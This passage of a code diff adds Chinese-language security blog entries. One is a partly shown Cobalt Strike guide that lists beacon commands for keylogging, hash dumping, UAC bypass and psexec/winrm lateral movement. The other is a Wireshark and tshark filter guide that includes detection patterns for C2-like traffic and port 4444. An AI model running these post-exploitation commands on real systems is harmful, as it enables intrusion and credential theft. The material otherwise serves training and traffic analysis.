+- Spear Phishing（钓鱼邮件）
+- Payload 生成
+
+### Host（主机管理）
+- Beacon 管理
+- 文件管理
+- 键盘记录
+- 截屏
+
+## 基础操作
+
+### 生成 Payload
+
+\`\`\`
+Attacks → Payload Generation → Windows Executable
+\`\`\`
+
+### 设置监听器
+
+\`\`\`
+Cobalt Strike → Listeners → Add
+\`\`\`
+
+### 执行 Payload
+将生成的可执行文件在目标机器上运行。
+
+### 交互命令
+
+\`\`\`
+shell cmd.exe           # 执行命令
+download file           # 下载文件
+upload file             # 上传文件
+keylogger               # 键盘记录
+screenshot              # 截屏
+hashdump                # 获取哈希
+\`\`\`
+
+## 权限提升
+
+\`\`\`
+getsystem               # 提权
+bypassuac               # 绕过UAC
+\`\`\`
+
+## 横向移动
+
+\`\`\`
+spawn                  # 生成新Beacon
+jump psexec            # PsExec横向
+jump winrm             # WinRM横向
+\`\`\`
+
+## 注意事项
+
+- CobaltStrike 是商业软件，需授权使用
+- 仅用于合法渗透测试
+- 注意通信特征检测
+    `
+  },
+  {
+    slug: 'wireshark-guide',
+    title: 'Wireshark 深度分析指南',
+    date: '2026-05-22',
+    category: 'tools',
+    subcategory: 'wireshark-tool',
+    tags: ['工具', 'Wireshark', '流量分析'],
+    summary: 'Wireshark 高级过滤和分析技巧。',
+    content: `
+## 高级过滤
+
+### HTTP 过滤
+
+\`\`\`
+http.request.method == "POST"
+http.request.uri contains "login"
+http.response.code >= 400
+http.cookie contains "session"
+\`\`\`
+
+### TCP 分析
+
+\`\`\`
+tcp.analysis.retransmission    # 重传
+tcp.analysis.zero_window       # 零窗口
+tcp.analysis.duplicate_ack     # 重复ACK
+tcp.flags.reset == 1           # RST包
+\`\`\`
+
+### DNS 分析
+
+\`\`\`
+dns.qry.name contains "malware"
+dns.flags.rcode != 0           # DNS错误
+dns.resp.len > 0               # 有响应
+\`\`\`
+
+### SSL/TLS 分析
+
+\`\`\`
+ssl.handshake.type == 1        # Client Hello
+ssl.handshake.type == 2        # Server Hello
+tls.handshake.extensions_server_name contains "target"
+\`\`\`
+
+## 提取数据
+
+### 导出文件
+
+\`\`\`
+File → Export Objects → HTTP
+File → Export Objects → DICOM
+File → Export Objects → SMB
+\`\`\`
+
+### 提取HTTP流
+
+\`\`\`
+右键 → Follow → HTTP Stream
+\`\`\`
+
+## 统计分析
+
+### 会话统计
+
+\`\`\`
+Statistics → Conversations
+Statistics → Protocol Hierarchy
+Statistics → Endpoints
+\`\`\`
+
+### IO Graph
+
+\`\`\`
+Statistics → I/O Graphs
+\`\`\`
+
+## Tshark 命令行
+
+\`\`\`bash
+# 捕获HTTP POST
+tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.request.uri
+
+# 提取DNS查询
+tshark -i eth0 -Y "dns.qry.name" -T fields -e dns.qry.name
+
+# 统计IP地址
+tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn
+\`\`\`
+
+## 安全分析
+
+### 检测异常流量
+
+\`\`\`
+# 大量DNS查询
+dns.qry.name && frame.len > 100
+
+# 可疑HTTP请求
+http.user_agent contains "curl"
+
+# 异常端口
+tcp.port == 4444
+\`\`\`
+
+### 分析恶意软件
+
+\`\`\`
+# C2通信
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+http.request.method == "POST" && http.content_length > 1000
+\`\`\`
+    `
+  },
   {
     slug: 'tcp-ip-basics',
     title: 'TCP/IP 基础',
